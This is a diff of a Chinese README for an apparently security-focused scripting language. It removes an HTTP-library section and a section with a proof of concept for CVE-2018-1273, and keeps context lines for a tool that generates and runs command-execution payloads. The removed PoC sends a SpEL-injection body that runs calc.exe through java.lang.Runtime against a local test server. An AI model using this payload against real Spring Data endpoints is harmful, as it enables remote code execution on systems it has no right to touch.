@@ -218,55 +218,7 @@ sub = string::substr(test,1,4);
 print(sub);
 ```
 
-### 03 HTTP库
-
-这也是最重要的库之一，基于`okhttp`实现
-
-支持直接`get`或`post`，也可以根据`Burp`的请求文件做请求
-
-```cpp
-#include "http"
-#include "string"
-
-// 请求头是Map类型
-headers = newMap();
-// 可以自行设置一些请求头（也可不设置）
-putMap(headers,"User-Agent","4ra1n");
-// URL
-url = "http://127.0.0.1:8080";
-// GET 请求
-response = http::doGet(url,headers);
-
-// POST 请求体
-body = "username=1&password=2"
-// 需要自行选择Content-Type
-// 默认支持form和json两种（也是最常见的两种）
-// form=application/x-www-form-urlencoded
-// json=application/form
-contentType = "form";
-// POST 请求
-http::doPost(url,headers,body,contentType);
-
-// 响应码
-code = getMap(response,"code");
-print("response code is: "+code);
-// 响应头也是Map类型
-respHeaders = getMap(response,"headers");
-// 从响应头中取值
-connection = getMap(respHeaders,"Connection")
-print("Connection: "+connection)
-// 获得响应体
-responseBody = getMap(response,"body");
-if string::contains(responseBody,"Tomcat")==true {
-    print("Tomcat")
-}
-
-// 使用请求报文
-req = readFile("1.txt");
-http::doRequest(req);
-```
-
-### 04 Tool库
+### 03 Tool库
 
 生成命令执行的`Payload`
 
@@ -289,25 +241,4 @@ print(payload);
 
 // 执行命令
 tool::exec(payload);
-```
-
-### 07 案例一
-
-案例一：针对`CVE-2018-1273`的`POC`
-
-```cpp
-#include "http"
-
-// CVE-2018-1273
-// https://xz.aliyun.com/t/2269
-def poc(){
-    // application/x-www-form-urlencoded alias
-    contentType = "form";
-    // request body (only in post method)
-    body = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc.exe\")]";
-    // do http post request
-    http::doPost("http://127.0.0.1:8080/users",newMap(),body,contentType);
-}
-
-poc();
 ```
